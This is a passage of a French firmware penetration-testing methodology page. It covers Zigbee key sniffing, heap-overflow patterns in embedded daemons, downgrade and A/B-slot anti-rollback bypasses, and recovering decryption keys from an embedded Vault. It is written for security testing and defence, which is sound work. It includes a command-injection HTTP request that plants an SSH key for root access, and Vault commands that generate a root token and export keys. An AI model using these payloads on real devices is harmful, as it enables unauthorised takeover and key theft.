Pour Zigbee en particulier, capturez le trafic d’appairage et vérifiez si la cible utilise toujours la **Link Key** par défaut `ZigBeeAlliance09`. Si c’est le cas, l’écoute du trafic d’appairage peut révéler la **Network Key**. Les codes d’installation de Zigbee 3.0 réduisent cette exposition ; vérifiez donc si l’appareil testé les impose réellement.

### Gestionnaires de protocoles spécifiques au fabricant et accessibilité contrôlée par FSM

Les commandes Zigbee/ZCL spécifiques au fabricant constituent souvent une meilleure cible que les clusters standardisés, car elles alimentent du **code d’analyse personnalisé** et des **FSM** internes dont la validation a été moins éprouvée.<sup>[[8]](#references)</sup>

Méthode pratique :

- Remontez le dispatcher des commandes jusqu’à trouver le **gestionnaire réservé au fabricant**.
- Retrouvez les tables d’**états FSM**, d’**événements**, de **vérifications**, d’**actions** et d’**états suivants**.
- Identifiez les **états transitoires** qui avancent automatiquement, ainsi que les branches de nouvelle tentative et d’erreur qui finissent par réinitialiser ou libérer l’état contrôlé par l’attaquant.
- Confirmez les échanges de protocole légitimes nécessaires pour placer le daemon dans l’état vulnérable, au lieu de supposer que le gestionnaire vulnérable est toujours accessible.

Pour les protocoles sensibles au timing, la relecture de paquets depuis un framework Python peut être trop lente. Une méthode plus fiable consiste à émuler un appareil légitime sur du matériel réel (par exemple un **nRF52840**) avec une pile de niveau professionnel du fabricant, afin d’exposer les **endpoints**, les **attributs** et le timing d’appairage appropriés.

### Classe de bugs de téléchargement fragmenté dans les daemons embarqués

Une classe de bugs récurrente dans les firmwares touche les téléchargements **fragmentés de blobs, de modèles ou de configurations** :<sup>[[8]](#references)</sup>

1. Le **premier fragment** (`offset == 0`) stocke `ctx->total_size` et alloue `malloc(total_size)`.
2. Les fragments suivants ne valident que les champs **locaux au paquet** contrôlés par l’attaquant, tels que `packet_total_size >= offset + chunk_len`.
3. La copie utilise `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sans vérifier qu’elle reste dans la **taille allouée initialement**.

Un attaquant peut ainsi envoyer :

- Un premier fragment valide déclarant une **petite** taille totale pour forcer une petite allocation sur le tas.
- Un fragment ultérieur avec l’**offset attendu**, mais un `chunk_len` plus grand.
- Une taille locale au paquet falsifiée qui satisfait les nouvelles vérifications tout en provoquant un dépassement du tampon alloué initialement.

Lorsque le chemin vulnérable est protégé par la logique d’appairage, l’exploitation doit inclure suffisamment d’**émulation de l’appareil** pour conduire la cible jusqu’à l’état de téléchargement de modèle ou de blob attendu avant d’envoyer les fragments malformés.

### Déclencheurs de `free()` pilotés par le protocole

Dans les daemons embarqués, le moyen le plus simple de déclencher une exploitation des métadonnées du tas consiste souvent non pas à « attendre le nettoyage », mais à **forcer le mécanisme de gestion des erreurs du protocole** :<sup>[[8]](#references)</sup>

- Envoyez des fragments de suivi malformés pour faire passer la FSM dans des états de **nouvelle tentative** ou d’**erreur**.
- Dépassez le seuil de nouvelles tentatives afin que le daemon **réinitialise le contexte** et libère le tampon corrompu.
- Utilisez cet appel prévisible à `free()` pour déclencher des primitives côté allocateur avant que le processus ne plante pour d’autres raisons.

Cette méthode est particulièrement utile contre les allocateurs de type **musl/uClibc/dlmalloc** sur Linux embarqué, où la corruption des métadonnées des chunks peut transformer la logique unlink/unbin en primitive d’écriture. Une méthode stable consiste à corrompre un **champ de taille** pour rediriger le parcours de l’allocateur vers de **faux chunks placés dans le tampon ayant subi un dépassement**, plutôt que d’écraser immédiatement de vrais pointeurs de bin et de faire planter le processus.

## Exploitation binaire et Proof-of-Concept

Développer un PoC pour les vulnérabilités identifiées nécessite une compréhension approfondie de l’architecture cible et de la programmation dans des langages de bas niveau. Les protections d’exécution binaires sont rares dans les systèmes embarqués, mais lorsqu’elles sont présentes, des techniques comme le Return Oriented Programming (ROP) peuvent être nécessaires.

### Notes sur l’exploitation des fastbins uClibc (Linux embarqué)

- **Fastbins et consolidation :** uClibc utilise des fastbins similaires à ceux de glibc. Une allocation importante ultérieure peut déclencher `__malloc_consolidate()` ; tout faux chunk doit donc passer les vérifications (taille cohérente, `fd = 0` et chunks voisins considérés comme « utilisés »).<sup>[[6]](#references)</sup>
- **Binaires non-PIE sous ASLR :** si ASLR est activé mais que le binaire principal est **non-PIE**, les adresses `.data/.bss` du binaire restent stables. Vous pouvez cibler une région qui ressemble déjà à un en-tête de chunk valide du tas pour faire aboutir une allocation fastbin sur une **table de pointeurs de fonctions**.
- **NUL qui arrête l’analyseur :** lors de l’analyse du JSON, un `\x00` dans la charge utile peut arrêter l’analyse tout en conservant les octets contrôlés par l’attaquant qui suivent, pour un pivot de pile ou une chaîne ROP.
- **Shellcode via `/proc/self/mem` :** une chaîne ROP qui appelle `open("/proc/self/mem")`, `lseek()` et `write()` peut placer du shellcode exécutable dans un mapping connu et sauter à son adresse.

## Systèmes d’exploitation préparés pour l’analyse de firmware

Des systèmes d’exploitation comme [AttifyOS](https://github.com/adi0x90/attifyos) et [EmbedOS](https://github.com/scriptingxss/EmbedOS) fournissent des environnements préconfigurés pour les tests de sécurité de firmware, équipés des outils nécessaires.

## Systèmes d’exploitation préparés pour analyser le firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos) : AttifyOS est une distribution conçue pour vous aider à réaliser des évaluations de sécurité et des tests d’intrusion sur des appareils Internet des objets (IoT). Elle vous fait gagner beaucoup de temps en fournissant un environnement préconfiguré avec tous les outils nécessaires.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS) : système d’exploitation de test de sécurité embarquée basé sur Ubuntu 18.04, préinstallé avec des outils de test de sécurité de firmware.

## Attaques par downgrade de firmware et mécanismes de mise à jour non sécurisés

Même lorsqu’un fabricant implémente la vérification cryptographique des signatures des images firmware, la **protection contre le retour à une version antérieure (downgrade)** est souvent omise. Lorsque le bootloader ou le chargeur de récupération vérifie uniquement la signature à l’aide d’une clé publique intégrée, sans comparer la *version* (ou un compteur monotone) de l’image à flasher, un attaquant peut installer légitimement un **ancien firmware vulnérable portant toujours une signature valide** et ainsi réintroduire des vulnérabilités corrigées.<sup>[[4]](#references)</sup>

Déroulement typique d’une attaque :

1. **Obtenir une ancienne image signée**
   * La récupérer sur le portail de téléchargement public, le CDN ou le site de support du fabricant.
   * L’extraire des applications mobiles/de bureau associées (par exemple, dans `assets/firmware/` d’un APK Android).
   * La récupérer depuis des dépôts tiers comme VirusTotal, des archives Internet, des forums, etc.
2. **Téléverser l’image vers l’appareil ou la lui fournir** par tout canal de mise à jour exposé :
   * Interface Web, API d’application mobile, USB, TFTP, MQTT, etc.
   * De nombreux appareils IoT grand public exposent des endpoints HTTP(S) *sans authentification* qui acceptent des blobs de firmware encodés en Base64, les décodent côté serveur et déclenchent une récupération ou une mise à niveau.
3. Après le downgrade, exploiter une vulnérabilité corrigée dans la version plus récente (par exemple, un filtre contre l’injection de commandes ajouté ultérieurement).
4. Éventuellement, reflasher la dernière image ou désactiver les mises à jour pour éviter d’être détecté après avoir obtenu la persistance.

### Exemple : injection de commandes après un downgrade

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

Dans le firmware vulnérable (rétrogradé), le paramètre `md5` est directement concaténé à une commande shell sans assainissement, ce qui permet d’injecter des commandes arbitraires (ici, pour activer un accès root par clé SSH). Les versions ultérieures du firmware ont introduit un filtre de caractères élémentaire, mais l’absence de protection contre la rétrogradation rend ce correctif inutile.<sup>[[4]](#references)</sup>

### Extraction du firmware depuis des applications mobiles

De nombreux fournisseurs intègrent des images complètes du firmware à leurs applications mobiles compagnons afin que l’application puisse mettre à jour l’appareil via Bluetooth/Wi-Fi. Ces packages sont généralement stockés sans chiffrement dans l’APK/APEX, sous des chemins tels que `assets/fw/` ou `res/raw/`. Des outils comme `apktool`, `ghidra` ou même la simple commande `unzip` permettent d’extraire des images signées sans manipuler le matériel physique.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Contournement de l’anti-rétrogradation réservé à l’updater dans les conceptions à slots A/B

Certains fournisseurs implémentent bien un **ratchet** anti-downgrade, mais uniquement dans la logique de l’*updater* (par exemple une routine UDS sur CAN, une commande de récupération ou un agent OTA en espace utilisateur). Si le **bootloader** vérifie ensuite uniquement la signature/CRC de l’image et fait confiance à la table de partitions ou aux métadonnées de slot, la protection contre les retours en arrière peut toujours être contournée.<sup>[[7]](#references)</sup>

Conception vulnérable typique :

- Les métadonnées du firmware contiennent à la fois un descripteur de version et un **ratchet de sécurité** / compteur monotone.
- L’updater compare le ratchet de l’image à une valeur stockée en mémoire persistante et rejette les anciennes images signées.
- Le bootloader **n’analyse pas** ce ratchet et vérifie uniquement l’en-tête, le CRC et la signature avant de démarrer le slot sélectionné.
- L’activation du slot est stockée séparément dans une table de partitions ou dans un compteur de génération par slot, et n’est **pas liée cryptographiquement** au digest exact du firmware qui a été validé.

Cela crée, dans les systèmes à deux slots, une primitive **valider une image / en démarrer une autre**. Si l’attaquant peut faire marquer le slot B comme prochaine cible de démarrage par l’updater à l’aide d’une image signée récente, puis écraser le slot B avant le redémarrage, le bootloader peut quand même démarrer l’image rétrogradée, car il ne fait confiance qu’aux métadonnées de slot déjà validées.

Schéma d’exploitation courant :

1. Téléverser un firmware **récent signé** dans le slot passif et exécuter la routine normale de validation/basculement afin que la disposition désigne ce slot comme prochain slot actif.
2. **Ne pas redémarrer tout de suite**. Relancer la routine de préparation/effacement du slot pendant la même session.
3. Exploiter un état de démarrage obsolète ou une logique de sélection de slot obsolète pour que l’updater efface le **même slot physique** qui vient d’être promu.
4. Écrire un firmware **plus ancien, mais toujours signé** dans ce slot.
5. Ignorer la routine de validation qui applique le ratchet et redémarrer directement.
6. Le bootloader sélectionne le slot promu, vérifie uniquement la signature/l’intégrité et démarre l’ancienne image.

Points à examiner lors de la rétro-ingénierie des implémentations de mise à jour A/B :

- Sélection du slot dérivée de **drapeaux définis au démarrage** qui ne sont pas actualisés après un basculement réussi.
- Routine de type `prepare_passive_slot()` qui efface un slot en fonction d’un état obsolète plutôt que de la **disposition actuelle validée**.
- Fonction de type `part_write_layout()` qui ne fait qu’incrémenter un **compteur de génération** / drapeau actif et ne stocke pas le hash de l’image validée.
- Vérifications du ratchet implémentées en espace utilisateur ou dans le code de l’updater, mais **absentes de la ROM / du bootloader / des étapes de secure boot**.
- Routines d’effacement ou de récupération qui laissent le slot marqué comme amorçable, même après que son contenu a été supprimé puis réécrit.

### Liste de contrôle pour évaluer la logique de mise à jour

* Le transport/l’authentification du *point de terminaison de mise à jour* est-il suffisamment protégé (TLS + authentification) ?
* L’appareil compare-t-il les **numéros de version** ou un **compteur monotone anti-rollback** avant le flashage ?
* L’image est-elle vérifiée au sein d’une chaîne de secure boot (par exemple, les signatures sont-elles vérifiées par le code ROM) ?
* Le **bootloader applique-t-il le même ratchet** que l’updater, au lieu de vérifier uniquement la signature/le CRC ?
* Les métadonnées d’activation du slot sont-elles **liées au digest/à la version du firmware validé**, ou le slot peut-il être modifié après sa promotion ?
* Après la réussite du basculement de slot, l’appareil est-il forcé de redémarrer, ou les routines ultérieures de mise à jour/d’effacement restent-elles accessibles pendant la même session ?
* Le code en espace utilisateur effectue-t-il des vérifications de cohérence supplémentaires (par exemple, sur la carte des partitions autorisées ou le numéro de modèle) ?
* Les flux de mise à jour *partiels* ou de *sauvegarde* réutilisent-ils la même logique de validation ?

> 💡  Si l’un des éléments ci-dessus manque, la plateforme est probablement vulnérable aux attaques par retour en arrière.

## Firmware vulnérable pour s’entraîner

Pour vous entraîner à découvrir des vulnérabilités dans le firmware, utilisez les projets de firmware vulnérables suivants comme point de départ.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Récupération de clés de déchiffrement de firmware à partir de l’état d’un KMS/Vault intégré

Lorsqu’une image de mise à jour combine de petites métadonnées en clair avec un grand bloc à haute entropie, analysez d’abord le conteneur avant toute tentative de force brute :<sup>[[1]](#references)</sup>

- Extrayez les en-têtes, les offsets et les limites de ligne avec `hexdump`, `xxd`, `strings -tx`, `base64 -d` et `binwalk -E`.
- `Salted__` indique généralement le format `enc` d’OpenSSL : les 8 octets suivants sont le salt et les octets restants sont le texte chiffré.
- Un champ Base64 qui se décode en exactement `256` octets indique fortement qu’il s’agit d’un texte chiffré RSA-2048 qui encapsule un mot de passe de firmware ou une clé de session aléatoire.
- Un élément PGP détaché dans le même fichier protège souvent uniquement l’authenticité ; ne supposez pas qu’il sert au chiffrement.

Si la recherche de clés statiques (`grep`, `strings`, recherches PEM/PGP) échoue, rétro-ingénieriez plutôt le **parcours de déchiffrement opérationnel** au lieu de chercher uniquement des clés privées :

- Décompilez le binaire de mise à jour/de gestion et suivez qui lit le blob chiffré, quel helper/API le déchiffre et quel nom de clé logique est demandé.
- Recherchez l’état KMS dans le système de fichiers racine extrait (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), ainsi que les fichiers unit et les scripts d’initialisation.
- Considérez les commandes `vault operator unseal ...` en clair, les clés de récupération, les tokens d’amorçage ou les scripts locaux d’auto-déverrouillage KMS comme équivalents à du matériel de clé privée.

Si l’appliance embarque le binaire Vault d’origine et son backend de stockage, reproduire cet environnement est généralement plus simple que de réimplémenter les composants internes de Vault :

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Avec un accès root sur le KMS cloné :

- Rendez les clés transit exportables uniquement dans le clone isolé : `vault write transit/keys/<name>/config exportable=true`
- Exportez la clé de déchiffrement : `vault read transit/export/encryption-key/<name>`
- Essayez la clé RSA récupérée avec la paire de padding/hash exacte utilisée par le KMS. Un échec du déchiffrement PKCS#1 v1.5 et un échec du déchiffrement OAEP par défaut ne prouvent **pas** que la clé est incorrecte ; de nombreux flux basés sur Vault utilisent OAEP avec SHA-256, alors que les bibliothèques courantes utilisent SHA-1 par défaut.
- Si la charge utile commence par `Salted__`, reproduisez exactement le KDF OpenSSL du fournisseur (`EVP_BytesToKey`, souvent MD5 sur les appareils anciens) avant de tenter le déchiffrement AES-CBC.

Le problème devient alors plus général que celui d'un « firmware chiffré » : **récupérer les clés opérationnelles côté appareil, puis reproduire hors ligne les paramètres exacts de déchiffrement et du KDF**.

## Formation et certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Craquer un firmware avec Claude : compétences de niveau senior, autonomie de niveau junior](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Méthodologie de test de sécurité des firmwares](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Pratique du hacking IoT : le guide définitif pour attaquer l'Internet des objets](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiter des zero-days dans du matériel abandonné – blog de Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Comment un appareil connecté à 20 $ m'a donné accès à votre domicile](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Maintenant vous voyez mi : maintenant vous êtes pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploitation du Tesla Wall Connector depuis le connecteur de charge - Partie 2 : contournement de la protection anti-downgrade](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Faites-le clignoter : exploitation over-the-air du Philips Hue Bridge](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS sur QEMU, partie 1 : dépaquetage](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Documentation du noyau Linux - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS sur QEMU, partie 2 : débogage et correction](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Mots de passe du BIOS Dell : le faible chiffrement XOR permet la récupération depuis la mémoire flash SPI (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Outils de récupération des mots de passe du BIOS Dell](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
